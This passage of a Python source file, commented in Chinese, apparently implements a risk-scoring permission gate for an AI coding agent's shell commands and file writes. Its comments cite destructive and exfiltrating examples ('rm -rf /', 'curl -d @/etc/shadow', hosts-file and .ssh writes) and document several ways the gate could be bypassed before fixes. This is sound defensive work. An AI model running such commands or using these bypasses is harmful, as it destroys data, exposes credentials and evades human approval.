                continue          # 重定向 / 后台符号，不是删除目标
            out.append(tok)
    return out


# ══════════════════════════════════════════════════════════════════════
#  ⭐ 非 rm 的删除方式，也要能提取目标
# ══════════════════════════════════════════════════════════════════════
# ⚠️ 2026-09-21 新增。起因是真实删除审计里的一个**规则不一致**：
#
#     同一条路径 D:/x/_dump_a.txt：
#       rm -f "D:/x/_dump_a.txt"                    → 0.50（命中可再生词表）
#       python -c "import os; os.remove('D:/x/_dump_a.txt')" → 0.90
#
#   因为 `_rm_targets()` 只解析 `rm`，Python 命令提取不到目标 ⇒ `_scope_adjust()`
#   里 `if targets and ...` 两个分支都不成立 ⇒ 直接落 0.90。
#
#   ⇒ **风险分取决于"用什么手段删的"，而不是"删的是什么"** —— 这显然是错的。
#     删的手段不该改变被删对象的价值。实测：26 次误报里有 7 次是这个原因。
#
#   仍然保持 fail-closed：无法枚举目标时（如 `for f in os.listdir(d): os.remove(f)`）
#   返回空列表，调用方照旧落 0.90 高危 —— 不猜。
_ALT_DELETE = re.compile(
    r"(os\.remove|os\.unlink|shutil\.rmtree|Remove-Item|\bdel\b|\berase\b|\brd\b|\brmdir\b)",
    re.IGNORECASE,
)

# ⚠️ 这里第一版写错了，值得记下来：
#   原写法 `['"]([^'"]{2,300})['"]` —— 想抓引号里的路径，结果是**贪婪匹配**
#   把外层的引号和内层的引号一起吞掉：
#
#     python -c "import os; os.remove('D:/x/_draft.txt')"
#     └── 第一个匹配是 `"import os; os.remove('`  ← 真正的路径反而没被捕获
#
#   实测后果：提取到 0 个目标 → 修法完全没生效（`_draft.txt` 仍判 0.90）。
#   **抓"引号里的路径"本身就是错的方向** —— 引号可以嵌套（Python -c 的脚本
#   里再套字符串），而路径的**形状**是稳定的。所以改成按形状抓：见 `_PATH_TOKEN`。
#
#   ⇒ 教训：要抽取的东西如果有稳定的形状，就按形状抓，不要借着外层的语法结构去定位。
_PATH_TOKEN = re.compile(r"(?:[A-Za-z]:)?(?:[\\/][^\s'\"<>|;&,*?]+)+")
_QUOTED_ANY = re.compile(r"'([^']{2,300})'|\"([^\"]{2,300})\"")


def _delete_targets(command: str) -> List[str]:
    """提取删除类命令的目标路径（rm 之外也覆盖）。"""
    out = _rm_targets(command)
    if out:
        return out
    if not _ALT_DELETE.search(command):
        return []

    found: List[str] = list(_PATH_TOKEN.findall(command))
    # 带引号、但没有目录分隔符的裸文件名也要收（如 os.remove('draft.txt')）
    for m in _QUOTED_ANY.finditer(command):
        tok = (m.group(1) or m.group(2) or "").strip()
        if tok and re.search(r"\.[A-Za-z0-9]{1,6}$", tok):
            found.append(tok)

    seen, dedup = set(), []
    for t in found:
        if t not in seen:
            seen.add(t)
            dedup.append(t)
    return dedup


def _scope_adjust(command: str, hit_label: str) -> Tuple[float, str]:
    """在"动作类型"判为高危之后，用"影响范围"做二次调整。"""
    # 杀进程：可重启，比删数据可逆；但按镜像名批量杀影响面大
    if "杀进程" in hit_label:
        if re.search(r"taskkill\b[^|;&]*/im\b", command, re.IGNORECASE):
            return 0.90, f"高危：{hit_label} —— 按镜像名批量杀，影响面不可控"

        # ⚠️ 2026-09-28 修真漏放：杀进程**本身**可重启（判温和是对的），
        #    但这条分支原来在这里就 return 了，**完全不看同一条命令里后面还跟着什么**。
        #    真实日志里的实例（判成 0.30 静默放行）：
        #        Stop-Process -Id 7852,33040 -Force
        #        Start-Sleep -Seconds 2
        #        Remove-Item -Recurse -Force D:\dsh\node_modules
        #    那次删的是 node_modules（可再生，侥幸无害），但同一结构换成桌面/文档目录
        #    就是不可逆损失 ⇒ 这是可被利用的绕过：前置一个"温和"动作就能吞掉后面的删除。
        #
        #    为什么 Bash 侧没这个问题：删除类分支用的是 `_delete_targets()`，它**扫整条
        #    命令的所有目标**，所以 `rm -f /tmp/a.txt; rm -rf C:/Desktop` 能正确判 0.90。
        #    ⇒ 只有杀进程分支是"盲"的。修法就是让它也扫一遍删除目标，取更严的那个。
        sub = _delete_scope(command, f"{hit_label} 之外还包含删除")
        if sub is not None:
            return sub

        # 杀自己启动的进程（通常从端口/PID 精确定位到 dev server）是可重启的。
        # 真实日志里这类有 84 条，全问一遍不现实 —— 判 low。
        return 0.30, f"温和：{hit_label} —— 可重启恢复，通常针对具体 PID"

    # 删除类：看目标能不能重建
    if any(k in hit_label for k in ("删除", "删表", "删库")):
        sub = _delete_scope(command, hit_label)
        # `_delete_scope` 返回 None = 命令里没抓到删除目标。
        # 原逻辑这时判 0.90（"目标非可再生资源"），保持不变。
        return sub if sub is not None else (0.90, f"高危：{hit_label} —— 目标非可再生资源")

    return 0.90, f"高危：{hit_label}"


# ══════════════════════════════════════════════════════════════════════
#  ⭐ 2026-09-28 补丁 D1：本命令**自己造出来的**文件，删掉必然可再生
# ══════════════════════════════════════════════════════════════════════
# 这是本轮唯一一条**靠构造成立、不需要猜**的判据：
#
#     git cat-file -p origin/main:data/memorix.db > /d/moss-tts-nano/tmp_remote_memorix.db
#     … 查一会儿 …
#     rm -f /d/moss-tts-nano/tmp_remote_memorix.db
#
#   目标在这条命令里刚被重定向写入 ⇒ 它**就是**这条命令的产物，删掉零风险。
#
#   跟"看名字像不像临时文件"这类弱信号完全不同：那里永远有"万一它是用户的文件呢"，
#   这里**没有万一** —— 就算那地方原本有个同名文件，上一步的 `>` 也已经把它覆盖了，
#   损失在写入那一刻就发生了，删除不再增加任何损失。
#
#   安全性是**构造性**的，不依赖任何启发式，所以可以给到 0.20（静默放行）。
#   ⚠️ 但只限"**所有**删除目标都是本命令造的"—— 混进一个别的目标就整条退回常规判定。
_REDIR_WRITE = re.compile(r">>?\s*[\"']?((?:[A-Za-z]:)?[\\/][^\s\"'<>|;&]+)")


# `backups` 目录里的文件**默认不可再生**（备份的意义就在这儿），
# 但当路径里同时带 `test` 时，它是"测试副本的备份"而不是真备份 ——
# 两个信号**同时**成立才认可，任缺其一都按不可再生处理。
_BACKUP_TEST_COPY = re.compile(r"[/\\]backups?[/\\]", re.IGNORECASE)


def _is_regenerable(target: str) -> bool:
    """可再生判定 = 词表命中 **或** 『backups 下的 test 副本』（双信号）。"""
    if _REGENERABLE.search(target):
        return True
    if _BACKUP_TEST_COPY.search(target) and "test" in target.lower():
        return True
    return False


def _self_created(command: str) -> set:
    """本命令里被 `>` / `>>` 写过的路径（小写、去尾部分隔符）。"""
    out: set = set()
    for m in _REDIR_WRITE.finditer(command):
        p = m.group(1).rstrip("\\/").lower()
        if p.startswith(("/dev/", "\\dev\\")):   # `2>/dev/null` 不是真目标
            continue
        out.add(p)
    return out


def _delete_scope(command: str, hit_label: str) -> Optional[Tuple[float, str]]:
    """扫**整条**命令里的删除目标，按"能不能重建"给出分数。

    ⚠️ 2026-09-28 从 `_scope_adjust` 里抽出来，是为了让**杀进程分支也能调用它**
    —— 见 `_scope_adjust` 里那段"修真漏放"的注释：杀进程分支原来直接 return 0.30，
    把同一条命令里后面的删除整个吞掉。

    关键点：`_delete_targets()` 扫的是**整条命令的所有目标**，不是第一个。
    所以 `rm -f /tmp/a.txt; rm -rf C:/Desktop` 会被正确判 0.90 —— Bash 侧一直是对的。

    @returns (分数, 理由)；命令里没有删除目标时返回 **None**（调用方自行兜底）。
    """
    targets = _delete_targets(command)
    if not targets:
        return None

    if any(_BROAD_SCOPE.search(t) for t in targets):
        return 0.95, f"高危：{hit_label} —— 目标含通配符/项目根/盘根，范围不可预知"

    # ⭐ D1：删的是本命令自己刚写出来的文件 ⇒ 必然可再生（判据是构造性的，见上方注释）
    created = _self_created(command)
    if created and all(t.rstrip("\\/").lower() in created for t in targets):
        return 0.20, (f"低危：{hit_label} —— 目标由本命令自己创建（同命令内重定向写入），"
                      f"删除不再造成任何额外损失")

    if all(_is_regenerable(t) for t in targets):
        # ⭐ 2026-09-23：可再生资源里，只有"严格草稿"才降到 low（静默放行）。
        # 两个条件必须**同时**成立：
        #   ① 每个目标都命中严格草稿形态（词表前缀 + 临时扩展名，见 `_STRICT_SCRATCH`）
        #   ② 没有任何目标位于耐久目录（记忆/桌面/文档/下载）
        # ⇒ 两条都是否决项：只要有一条不满足，整条命令退回 0.50
        #   （宁可多问一次，也不静默删掉不该删的东西）
        #
        # ⚠️ 关于"像不像文件"：这条约束现在**由 ① 的正则承担**（它强制要求结尾是
        #   临时扩展名），所以不再单独写 `looks_like_file`。
        #   历史原因：第一版用「下划线开头」判草稿时，`rm -rf "D:/_aw_dl"`（递归删
        #   整个目录）会被静默放行，当时靠"basename 带扩展名"补挡。改用词表后，
        #   该场景已被词表天然排除（`aw_dl` 不在词表里）。
        strict_ok = (all(_STRICT_SCRATCH.search(t) for t in targets)
                     and not any(_DURABLE_DIRS.search(t) for t in targets))
        if strict_ok:
            return 0.20, (f"低危：{hit_label} —— 目标为本次任务的草稿/中间产物"
                          f"（可再生，且不在记忆/桌面/文档目录）")
        return 0.50, f"中危：{hit_label} —— 目标为可再生资源（依赖/缓存/临时/测试产物）"

    return 0.90, f"高危：{hit_label} —— 目标非可再生资源"


def _first_hit(text: str, patterns: List[Tuple[str, str]]) -> Optional[str]:
    """返回第一个命中的模式说明，没命中返回 None。"""
    for pat, label in patterns:
        if re.search(pat, text, re.IGNORECASE):
            return label
    return None


def _strip_quoted(text: str) -> str:
    """把引号包裹的内容挖掉，只留命令骨架。

    用途：识别"危险词只是被引用"的情况。`grep "rm -rf" .` 和 `rm -rf /`
    在正则眼里一样危险，但只有后者是真的在执行删除。
    判据是：**危险词是否只出现在引号里**。
    """
    return re.sub(r"\"[^\"]*\"|'[^']*'", " ", text)


# ══════════════════════════════════════════════════════════════════════
#  heredoc 正文：是"要执行的代码"还是"要写入的数据"？
# ══════════════════════════════════════════════════════════════════════
# ⚠️ 2026-09-28 从影子回放（4241 条真实调用 + SemIf 审计）里挖出来的误报源。
#
#   `<<'EOF' … EOF` 这段正文算不算命令，取决于**它喂给谁**：
#
#     · `python - <<'PY'` / `node - <<'EOF'`  ⇒ stdin 是**脚本** ⇒ 正文真的会执行
#       实例（规则判 high 是对的，是模型看走眼了）：
#           import shutil; shutil.rmtree(d)          ← 在正文里，会跑
#           os.remove(tone)                          ← 在正文里，会跑
#
#     · `cat >> 报告.md <<'EOF'` / `tee x <<'EOF'`   ⇒ stdin 是**文件内容** ⇒ 不执行
#       实例（真误报，报告正文里提到 "rmtree" 三个字就被判 0.90 high）：
#           cat >> ".../.workbuddy/memory/2026-09-05.md" <<'EOF'
#           …本文提到 shutil.rmtree 这个词…
#           EOF
#
#   ⇒ 所以**不能一刀切挖掉 heredoc**。判据是 `<<` 前面那个命令是什么。
#
#   规模：4241 条里含 heredoc 的 182 条（4.3%），其中判 high 10 条、medium 7 条。
#
#   ⚠️ 顺序要求：必须在 `_strip_quoted` **之前**跑。因为结束标记常写成 `'EOF'`／`"EOF"`，
#      先剥引号的话标记就没了，正文也就定位不到 —— 这个坑是改的时候才发现的。
_HEREDOC_MARK = re.compile(r"<<-?\s*['\"]?([A-Za-z_][A-Za-z0-9_]*)['\"]?")

# stdin 被当成**代码**执行
_HEREDOC_CODE_SINK = re.compile(
    r"\b(python|python3|python\.exe|node|node\.exe|bash|sh|zsh|dash|ksh"
    r"|pwsh|powershell|powershell\.exe|ruby|perl|php|osascript)\b",
    re.IGNORECASE,
)
# stdin 被当成**数据**写进文件
_HEREDOC_DATA_SINK = re.compile(r"\b(cat|tee)\b", re.IGNORECASE)

# ⚠️ 反过来的一条 fail-closed：**写入目标是脚本就不许剥**。
#    否则 `cat > /tmp/x.sh <<'EOF' \n rm -rf / \n EOF \n bash /tmp/x.sh` 这种写法，
#    正文一剥，`rm -rf` 就凭空消失了 —— 等于给了绕过门控的新路子。
#    （4241 条真实日志里没有这种写法，但绕过口子不能因为它"还没出现过"就留着。）
#    目标是可执行/脚本后缀 ⇒ 正文按"会执行"处理，保留扫描。
_SCRIPT_EXT = re.compile(
    r"\.(sh|bash|zsh|ps1|psm1|py|pyw|js|mjs|cjs|ts|bat|cmd|vbs|rb|pl|php|awk)\b",
    re.IGNORECASE,
)
# `cat > target` 里的 target
_HEREDOC_WRITE_TARGET = re.compile(r">>?\s*[\"']?([^\s\"'>;]+)")


def _strip_heredoc_body(text: str) -> Tuple[str, int]:
    r"""挖掉『数据型』heredoc 的正文。返回 `(剩余文本, 挖掉的字符数)`。

    认不出接收方、或接收方是解释器 ⇒ **fail-closed 保留正文**（宁可多问一次）。
    """
    out, removed, pos = text, 0, 0
    for _ in range(8):                     # 上限防呆：不会真有命令嵌 8 层 heredoc
        m = _HEREDOC_MARK.search(out, pos)
        if not m:
            break
        tag = m.group(1)
        # `<<` 之前、最近一个分隔符之后的那一小段，决定 stdin 归谁
        seg = re.split(r";|&&|\|\||\n", out[: m.start()])[-1]
        if _HEREDOC_CODE_SINK.search(seg) or not _HEREDOC_DATA_SINK.search(seg):
            pos = m.end()                  # 代码型 / 认不出 ⇒ 不挖，继续找下一个
            continue
        # 写进去的是脚本 ⇒ 正文将来会被执行 ⇒ 不许剥（见 `_SCRIPT_EXT` 上方注释）
        tgt = _HEREDOC_WRITE_TARGET.search(seg)
        if tgt and _SCRIPT_EXT.search(tgt.group(1)):
            pos = m.end()
            continue
        # 结束标记：正文之后**独占一行**的那个 tag（`  EOF` 也算）
        close = re.search(rf"^[ \t]*{re.escape(tag)}[ \t]*$", out[m.end():], re.MULTILINE)
        if not close:
            pos = m.end()
            continue
        end = m.end() + close.end()
        nl = out.find("\n", end)
        end = len(out) if nl == -1 else nl + 1
        removed += end - m.start()
        # ⚠️ 接缝必须补一个语句分隔符，不能直接拼。
        #    实测教训：`cat > "x.py" <<'PYEOF' … PYEOF` 后面还跟着 `python.exe "x.py"`，
        #    直接拼就成了 `cat > "x.py" python.exe "x.py"`，剥引号后 `> ` 紧挨着
        #    `C:/Python311/python.exe` ⇒ 误命中"重定向写入指定路径"，把 python.exe 当成了
        #    重定向目标 ⇒ 0.05 误升成 0.50。用换行没用（`\s*` 会跨过 \n），得用 `;`。
        #    heredoc 结束后的下一条命令本来就是独立语句，补 `;` 在语义上也正确。
        out = out[: m.start()] + " ;\n" + out[end:]
        pos = m.start()
    return out, removed


# ══════════════════════════════════════════════════════════════════════
#  两个「按目标判定」的特例（2026-09-28 补丁 A / B）
# ══════════════════════════════════════════════════════════════════════
_PS_WRITE_LABEL = "写文件（PowerShell）"
_SCHTASKS_LABEL = "计划任务"

_ABS_PATH = re.compile(r"[A-Za-z]:[\\/][^\s\"'<>|;*?]{0,200}")
_TEMP_ENV = re.compile(r"\$env:(TEMP|TMP)\b|%TEMP%|%TMP%|\$\{?TMPDIR\}?", re.IGNORECASE)


def _ps_write_risk(command: str) -> Tuple[float, str]:
    r"""PowerShell 写文件（`Set-Content` / `Out-File` / `Add-Content`）：按目标路径判。

    ════ 为什么要改：原来这一条是**无差别 0.50**，跟 Write 工具口径不一致 ════

      · `Write` 工具写 `D:\任意目录\x.txt` → `path_risk()` → **0.20 low**
      · `Set-Content "D:\同一个目录\x.txt"` → 旧规则 → **0.50 medium**

    同一个目标、同一个效果，只因为走的工具不同就差一档 —— 这是规则内部的口径漂移，
    不是"模型觉得它是误报"。4241 条里这一类有 35 条，是 medium 档第二大打扰源。

    改成复用 `path_risk()` 之后，两个方向同时修：
      · 降噪：写普通目录 / Temp  0.50 → 0.20（low）
      · **补漏放**：写 `C:\Windows\…`、`.ssh`、`.gitconfig` 等  0.50 → **0.85（high）**
        —— 旧规则把"用 PowerShell 改 hosts 文件"只判成中危，这是真漏放，改完才发现的。

    ⚠️ fail-closed：命令文本里抓不到任何路径（写了但目标在变量里且无从推断）
       ⇒ 保持 0.50，**不放松**。
    """
    paths = list(_ABS_PATH.findall(command))
    if _TEMP_ENV.search(command):
        # `$env:TEMP\cccheck.txt` 这种写法抓不到字面盘符路径，
        # 但它是确定无疑的临时目录 —— 折成真实路径参与统一判定。
        paths.append(_in_home(r"\appdata\local\temp\_"))
    if not paths:
        return 0.50, f"中危模式：{_PS_WRITE_LABEL} —— 命令文本里没有目标路径，无法判定"

    best, why = 0.0, ""
    for p in paths:
        s, w = path_risk(p)
        if s > best:
            best, why = s, w

    # 理由要说实话：目标是临时目录就别报"普通目录"——
    # 门控弹窗上写着理由，说错了比判错了更糟（用户照着理由决定放不放行）。
    if best < 0.35 and _TEMP_ENV.search(command):
        why = "目标在临时目录（$env:TEMP），内容本就可丢弃"

    if best >= 0.75:
        return best, f"高危：{_PS_WRITE_LABEL} —— {why}"
    if best >= 0.35:
        return best, f"中危模式：{_PS_WRITE_LABEL} —— {why}"
    return best, f"温和：{_PS_WRITE_LABEL} —— {why}"


# 计划任务的子命令：`/create` `/change` `/delete` `/run` `/end` 会改动，`/query` 不改。
# 注意 Git Bash 下 `/` 常被写成 `//`（MSYS 路径转义），所以两边都要认。
_SCHTASKS_MUTATE = re.compile(r"/{1,2}(create|change|delete|run|end)\b", re.IGNORECASE)
_SCHTASKS_QUERY = re.compile(r"/{1,2}query\b", re.IGNORECASE)


def _schtasks_risk(command: str) -> Tuple[float, str]:
    """计划任务：把『只读查询』和『创建/修改/删除』分开。

    ════ 证据 ════
    4241 条里 3 条命中，其中 2 条是纯查询，且被 SemIf 以 ≥0.98 置信度判为只读：

        schtasks /query  /tn HeadroomProxy /v /fo list        ← 只读
        schtasks //query //tn "cc-connect" //fo LIST          ← 只读（Git Bash 下 // ）

    旧规则 `\bschtasks\b` 无差别命中 ⇒ 一条"列一下计划任务"也被要求确认。

    ⚠️ fail-closed：出现变更类子命令、或**认不出子命令** ⇒ 一律按 0.50 中危处理。
       只有**明确只是 query** 才降档。
    """
    if _SCHTASKS_MUTATE.search(command):
        return 0.50, f"中危模式：{_SCHTASKS_LABEL}（创建/修改/删除/触发）"
    if _SCHTASKS_QUERY.search(command):
        return 0.20, f"只读：查询{_SCHTASKS_LABEL}（不改动）"
    return 0.50, f"中危模式：{_SCHTASKS_LABEL}（子命令不可识别，fail-closed 按改动处理）"


def _command_risk_base(command: str) -> Tuple[float, str]:
    """按命令文本判定风险分（两个维度：动作类型 × 影响范围）。

    这是**模式识别**，不是穷举 —— `command` 是任意字符串，规则不可能覆盖全部。
    所以会同时存在误报和漏报，两个方向都要如实报出来：

      · 误报：`grep "rm -rf"` 命中高危模式（危险词只在引号里）
      · 漏报：用 Python 脚本删文件、或危险操作藏在变量里的

    误报方向刻意放松（宁可多问一次），但**范围维度**会把它拉回来
    —— 见 `_scope_adjust`。
    """
    if not command or not command.strip():
        return 0.0, "空命令"

    # 先看"命令骨架"（挖掉引号内容）：如果骨架里没有危险动作，
    # 说明危险词只是被搜索/打印，不算高危 —— 这是修正误报的关键一步。
    #
    # ⚠️ 但有一个必须排除的例外：引号里装的是**被执行的代码**
    #    （`python -c "..."`、`bash -c "..."`、`eval "..."`、`iex "..."`）。
    #    这种情况下引号内的内容真的会跑，剥离引号等于把危险一起抹掉。
    #    实测教训：不加这个判断，`python -c "import os; os.remove('x')"`
    #    会被当成"引用语境"直接放行 —— 那是真漏放。
    executes_code = _EXECUTES_CODE.search(command)
    if executes_code:
        # 引号里装的是要执行的代码 ⇒ 一个字都不能剥
        skeleton = command
    else:
        # ⚠️ heredoc 必须**先于** `_strip_quoted` 处理：结束标记常写成 `'EOF'`／`"EOF"`，
        #    先剥引号的话标记就没了，正文定位不到 ⇒ 挖不掉（这个坑是改的时候踩到的）。
        skeleton = _strip_quoted(_strip_heredoc_body(command)[0])

    # ⑦ 通过 API / CLI 删除**远端**资源（不可逆，见 `_API_DELETE` 上方注释）。
    #    放在 HIGH_PATTERNS 之前，因为这类命令里往往不含 rm/Remove-Item，
    #    走模式表根本命中不了。用 `skeleton` 判 ⇒ `grep "gh api -X DELETE"` 不会被打扰。
    if _API_DELETE.search(skeleton):
        return 0.90, "高危：通过 API/CLI 删除远端资源（gh/glab，不可逆）"
    if _HTTP_DELETE.search(skeleton) and _has_external_target(skeleton):
        return 0.90, "高危：向外部目标发送 DELETE 请求（远端资源删除，不可逆）"

    # ⚠️⚠️ 2026-09-29 修**结构性**漏放：原来只取**第一个**命中的高危模式。
    #    `_first_hit` 命中后立刻 `_scope_adjust` 然后 return ——
    #    如果这个命中恰好被降档（可再生删除 0.20 / 杀进程 0.30），
    #    **同一条命令里的其他动作就全都看不见了**。
    #
    #    真实日志证据 rid=3823（628 字符的 PowerShell 脚本）：
    #      Stop-ScheduledTask -TaskName 'cc-connect'      ← 单独判 0.50（会问）
    #      … Stop-Process -Id $_.Id -Force                ← 单独判 0.30（降档）
    #    ⇒ 合在一起原判 **0.30 low 静默放行**。计划任务那条中危被杀进程的降档吃掉了。
    #
    #    更狠的构造（本次实测，非日志）：
    #      rm -f /d/dsh/_sess_dump.txt ; Set-Content -Path C:/Windows/…/hosts -Value x
    #    ⇒ 原判 **0.20 low**，即**改 hosts 文件被静默放行**。
    #
    #    改法两条：
    #      ① 高危改成「取所有命中里**降档后最高**的那个」，不再是第一个；
    #      ② 加**中危地板**：降档只能降高危自己，不能把同命令里的另一个中危动作一起压没。
    #    两条都只升不降 ⇒ 只会多问，不会把原本要问的变成静默放行。
    hi: Optional[Tuple[float, str]] = None
    hi_spans: List[Tuple[int, int]] = []
    for pat, label in _HIGH_PATTERNS:
        m = re.search(pat, skeleton, re.IGNORECASE)
        if not m:
            continue
        hi_spans.append(m.span())
        cand = _scope_adjust(command, label)
        if hi is None or cand[0] > hi[0]:
            hi = cand

    # 中危同样不能只取第一个命中：
    #   `rm -f /d/dsh/_sess_dump.txt; Set-Content C:/Windows/…/hosts -Value x`
    #   中危表里"删除文件"排在"写文件（PowerShell）"前面，取第一个就只能拿到 0.50，
    #   而真正该报的是 `_ps_write_risk` 给出的 **0.85 改 hosts**。
    # ⇒ 与高危同处理：逐条算分（这两个特殊标签看**目标是什么**，与 Write/Edit 同口径），取最高。
    med: Optional[Tuple[float, str]] = None
    for pat, label in _MEDIUM_PATTERNS:
        m = re.search(pat, skeleton, re.IGNORECASE)
        if not m:
            continue
        # ⚠️ 去重：中危命中若与某个高危命中落在**同一段文字**上，那是同一个动作，
        #    高危那边已经用 `_scope_adjust` 算过精化分（可再生 0.20 / 用户资产 0.90）。
        #    这里不能再拿固定的 0.50 把它顶回去 ——
        #    实测反例：`rm -f /d/dsh/_sess_dump.txt` 高危降档 0.20，
        #    中危表里另有一条"删除文件"也命中它 ⇒ 不去重就会被顶回 0.50，
        #    把补丁 D 的草稿降档整个吃掉。
        if any(not (m.end() <= s or e <= m.start()) for s, e in hi_spans):
            continue
        if label == _PS_WRITE_LABEL:
            cand = _ps_write_risk(command)
        elif label == _SCHTASKS_LABEL:
            cand = _schtasks_risk(command)
        else:
            cand = (0.50, f"中危模式：{label}")
        if med is None or cand[0] > med[0]:
            med = cand

    # 骨架干净，但原文有危险词 → 是引用语境（grep/echo 里带了危险词）。
    # 真实日志里这类有 25 条，`grep -rn "rm -rf" .` 没有任何危害，判中危纯属打扰。
    #
    # ⚠️ 2026-09-29 修：原来这条是**无条件提前 return**，会把同命令里**真实存在**的
    #    中危动作一起盖掉。实测（改之前就是错的，不是补丁 E 引入的）：
    #      Start-Process powershell -ArgumentList "Remove-Item -Recurse -Force D:/data"
    #      ⇒ 0.15 **静默放行**。骨架里有中危"启动进程"(0.50)，却被 0.15 抢先返回。
    #    ⇒ 只有**没有任何真实信号**（hi/med 都为空）时才判引用语境。
    if hi is None and med is None and _first_hit(command, _HIGH_PATTERNS):
        return 0.15, "危险词仅出现在引号内（搜索/打印语境），无实际执行"

    if hi and med:
        return hi if hi[0] >= med[0] else med
    if hi:
        return hi
    if med:
        return med

    hit = _first_hit(skeleton, _MILD_PATTERNS)
    if hit:
        return 0.25, f"温和操作：{hit}"

    return 0.05, "未命中风险模式（读操作/查询类）"


def command_risk(command: str) -> Tuple[float, str]:
    """对外入口：基础判定 **+ 跨领域硬化检查**，取两者较高分。

    ⚠️ 为什么用"包装 + max"而不是直接在 `_command_risk_base` 里插分支：
       插分支会改变既有分支的走向（有可能把原本 `high` 的判定沿途降成 `medium`）。
       `max` 保证这条新规则**只升不降** ——
       它只会让更多命令被问一次，**绝不会让任何原本要问的命令变成静默放行**。
       这是一条"加严"改动应有的形状。
    """
    base_score, base_why = _command_risk_base(command)
    if not command or not command.strip():
        return base_score, base_why

    # 与基础判定同一套"引号里装的是不是被执行的代码"的判断，
    # 决定硬化检查看**原文**还是**去掉引号的骨架**：
    #   · `bash -c "curl -d @/etc/shadow …"` ⇒ 传原文（引号里会真的执行）
    #   · `grep "curl -d @/etc/shadow" notes.txt` ⇒ 传骨架（只是搜索，不打扰）
    executes_code = _EXECUTES_CODE.search(command)
    extra = _hardening_risk(command if executes_code else _strip_quoted(command))
    if extra and extra[0] > base_score:
        return extra
    return base_score, base_why


# ══════════════════════════════════════════════════════════════════════
#  Edit / Write：按目标路径判定
# ══════════════════════════════════════════════════════════════════════

# 用户主目录（跨平台取法，避免在代码里写死用户名 —— 2026-09-29 发布前清理）。
_HOME = os.path.expanduser("~").lower().rstrip("\\/")      # 例：c:\users\alice


def _in_home(sub: str) -> str:
    """把「主目录下的某个子目录」拼成小写绝对路径。"""
    return _HOME + sub.lower().replace("/", "\\")


# 可信根：本次会话的工作区、本项目、以及本机自己维护的记忆库。
# 落在这些目录里的改动视为低风险（写坏了也能从 git 恢复）。
#
# ⚠️ 换机器必须改：**默认表是本机的**，在别的机器上大概率一条都不匹配。
#    不匹配 = 判得更严（多弹窗），不会更松 ⇒ 默认方向是安全的。
#    要接自己的目录，设环境变量 `SAFEGATE_TRUSTED_ROOTS`（分号分隔，大小写不敏感）：
#      SAFEGATE_TRUSTED_ROOTS="D:\my-project;D:\my-notes"
_TRUSTED_ROOTS_DEFAULT = ()
#   ↑ 发布版**刻意留空**：原表是作者本机的目录，写进公开仓库既泄路径、
#     换机器又一条都不匹配。
#   ⚠️ 留空是**安全的**：这个表只影响 `path_risk()` 里 0.10 与 0.20 的差别，
#     两档都在 `low` 区间（<0.35）⇒ **门控结果完全一致**（都是 allow）。
#     它只让理由文案更具体，不是安全边界。想要那点文案，自己设：
#       SAFEGATE_TRUSTED_ROOTS="D:\my-project;D:\my-notes"
TRUSTED_ROOTS = (
    tuple(p.strip().lower() for p in os.environ["SAFEGATE_TRUSTED_ROOTS"].split(";")
          if p.strip())
    if os.environ.get("SAFEGATE_TRUSTED_ROOTS")
    else _TRUSTED_ROOTS_DEFAULT
)

# 系统目录 / 全局配置：改动这些地方影响面超出本次任务，且往往不可逆
#
# ⚠️⚠️ 这里的每一条是**普通子串**，不是正则 —— 下面用 `marker in p` 匹配。
#    2026-09-28 修真漏放：原来有两条写成了正则风格，于是**从未命中过**：
#      · `r"\.ssh\\"`        → 子串里有两个反斜杠，真实路径只可能有一个 ⇒ 永不命中
#      · `r"\.bashrc|\.profile"` → 把 `|` 当"或"用，但子串匹配里它就是个竖线字符 ⇒ 永不命中
#    实测后果（修之前）：
#        Write/Edit 写 C:/Users/alice/.ssh/id_rsa   → 0.20 **放行**
#        Write/Edit 写 C:/Users/alice/.ssh/config   → 0.20 **放行**
#        Write/Edit 写 C:/Users/alice/.bashrc       → 0.20 **放行**
#    而 `.gitconfig` 能正确判 0.85 —— 只因为它写成 `\.gitconfig` 恰好是合法子串。
#    ⇒ 新增条目时务必确认是子串语义；要表达"或"就拆成两条。
SYSTEM_MARKERS = (
    r"c:\windows",
    r"c:\program files",
    r"c:\program files (x86)",
    r"c:\programdata",
    r"c:\$recycle.bin",
    r"c:\system volume information",
    r"\appdata\roaming\microsoft\windows\start menu",  # 启动项
    r"\drivers\etc\hosts",
    "\\.ssh\\",            # SSH 密钥与配置（原来写成 r"\.ssh\\" ⇒ 双反斜杠，从未命中）
    r"\.gitconfig",        # 全局 git 配置
    r"\.npmrc",            # 全局 registry 配置
    "\\.bashrc",           # shell 启动配置（原来两条挤在一条里带 `|` ⇒ 从未命中）
    "\\.profile",
    "\\.aws\\",            # 云凭据
    "\\credentials",       # 各类凭据文件
)


def path_risk(file_path: str) -> Tuple[float, str]:
    r"""按目标文件路径判定 Edit/Write 的风险分。

    ════ 这里的判据是真实日志逼出来的，改过一次 ════

    第一版按"是否在可信根白名单内"判：不在名单里就给 0.40（medium）。
    在 8618 条真实调用上跑出来的结果是 **Edit 打扰率 50.0%**（816/1633）——
    因为白名单只列了 5 个目录，而用户真实的项目散布在
    `d:\cc-connect-patch`、`d:\memorix-src`、`d:\memorix-chat`、`d:\remotion-project`
    等等几十个目录里，全部落在名单外。

    ⇒ **教训：可信范围不能硬编码成静态白名单。** 真实工作区是动态的，
       正确做法是从会话上下文（cwd / 项目根）推导。
       白名单可以作为补充，但不能当作主要判据。

    现在的判据回到**"坏了能不能恢复"**这个本质问题：

      · Edit 是**精确字符串替换**，改错了能改回来，也不影响文件其他部分
      · Write 覆盖文件，但项目内的文件通常有 git 可回退
      · 两者都**不会删文件**
      ⇒ 所以"改项目里的文件"风险本来就低 —— 这恰恰是 agent 的主要工作，
        每次都要求确认等于让门控不可用。

    真正该拦的是**影响面超出本次任务**的改动：系统目录、启动项、SSH 配置、全局配置。
    """
    if not file_path or not file_path.strip():
        return 0.20, "路径为空，无法判断"

    p = file_path.replace("/", "\\").lower()

    for marker in SYSTEM_MARKERS:
        if marker in p:
            return 0.85, f"目标位于系统关键位置或全局配置（{marker}）"

    # 盘符根目录下直接写文件（而非项目子目录）
    if re.match(r"^[a-z]:\\[^\\]*$", p):
        return 0.55, "目标在盘根目录下"

    # 已知项目目录：更低（有 git 兜底的概率高）
    for root in TRUSTED_ROOTS:
        if p.startswith(root):
            return 0.10, f"目标在已知项目目录内（{root}）"

    # 其余普通目录：默认信任 —— agent 在本机改文件是可恢复的常规工作
    return 0.20, "目标在普通目录内，改动可通过 git/回收站恢复"


